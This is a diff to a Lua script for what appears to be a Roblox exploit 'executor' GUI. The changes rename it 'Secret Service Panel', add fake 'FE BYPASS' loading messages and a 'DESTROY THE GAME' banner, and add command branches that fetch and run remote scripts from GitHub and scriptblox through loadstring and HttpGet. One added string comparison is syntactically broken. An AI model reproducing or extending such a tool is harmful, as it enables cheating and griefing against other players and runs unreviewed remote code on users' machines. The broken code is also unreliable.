@@ -263,7 +263,7 @@ TextLabel_2.BorderSizePixel = 0
 TextLabel_2.Position = UDim2.new(0.250950575, 0, 0, 0)
 TextLabel_2.Size = UDim2.new(0, 237, 0, 31)
 TextLabel_2.Font = Enum.Font.SourceSans
-TextLabel_2.Text = "Executor"
+TextLabel_2.Text = "Secret Service Panel"
 TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.TextScaled = true
 TextLabel_2.TextSize = 13.000
@@ -451,7 +451,7 @@ Respawn.BorderSizePixel = 0
 Respawn.Position = UDim2.new(0.579847872, 0, 0.875968993, 2)
 Respawn.Size = UDim2.new(0, 142, 0, 26)
 Respawn.Font = Enum.Font.SourceSans
-Respawn.Text = "Respawn"
+Respawn.Text = "Execute&Console"
 Respawn.TextColor3 = Color3.fromRGB(0, 0, 0)
 Respawn.TextScaled = true
 Respawn.TextSize = 14.000
@@ -581,8 +581,10 @@ local function EYBRV_fake_script() -- Inject.LocalScript
 		if injected == false then
 			local message = Instance.new("Message")
 			message.Parent = workspace
-			message.Text = "FE BYPASS LOADING.."
-			wait(2)
+			message.Text = "FE BYPASS LOADING..."
+			wait(1)
+			message.Text = "ASSETS LOADING..."
+			wait(1)
 			message.Text = "REQUIRE LOADER LOADING..."
 			wait(2)
 			message.Text = "SSP LOADED DESTROY THE GAME!"
@@ -1140,7 +1142,7 @@ local function MAGV_fake_script() -- R6.LocalScript
 	local script = Instance.new('LocalScript', R6)
 
 	script.Parent.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/rusello25/scripts/main/R6", true))()
+		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-from-R15-to-R6-9639"))()
 	end)
 end
 coroutine.wrap(MAGV_fake_script)()
@@ -1218,6 +1220,10 @@ local function IUOIY_fake_script() -- exe.LocalScript
 			loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/Ro-Xploit'),true))()
 		elseif script.Parent.Parent.TextBox.Text == "require(5051243290).mml('"..game.Players.LocalPlayer.Name.."')" then
 			loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/mml%20admin'),true))()
+		elseif script.Parent.Parent.TextBox.Text == "print("serverside")" then
+			warn("serverside")
+		elseif script.Parent.Parent.TextBox.Text == "require(17245199712)('"..game.Players.LocalPlayer.Name.."')" then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/MagnumIceCream/SecretServicePanel/6fefdf531e86404fb41b7812e7e84b69c7ea728f/ShakesSSP"))()
 		end
 	end)
 end
